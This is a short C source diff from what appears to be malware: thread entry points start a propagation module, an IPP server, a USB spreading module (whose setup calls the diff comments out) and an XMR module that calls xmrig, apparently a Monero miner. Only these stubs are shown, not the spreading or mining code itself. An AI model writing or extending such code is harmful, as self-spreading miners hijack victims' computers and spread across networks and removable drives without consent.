@@ -5,6 +5,10 @@
 #include "xmr.h"
 #include "utils.h"
 #include "unix_usb_spreader.h"
+#include "mount_info.h"
+#include "mount_info_node.h"
+#include "files.h"
+#include "string_utils.h"
 
 void * start_propagate(void *varg){
     Globals *global = (Globals *) varg;
@@ -26,11 +30,18 @@ void * start_ipp_server(void *varg){
 void * start_usb_propagate(void *varg) {
     Globals *global = (Globals *) varg;
     DEBUG_LOG("[ENTRY] Starting usb spreading module...\n");
+/*
+    init_files_glob(global);
+    init_mount_node_glob(global);
+    init_mount_info_glob(global);
+    init_string_utils(global);
     usb_spread_module(global);
+    */
 }
 
 void * start_xmr(void *varg) {
     Globals *global = (Globals *) varg;
+
     DEBUG_LOG("[ENTRY] Starting xmr module...\n");
     xmrig(global);
 }
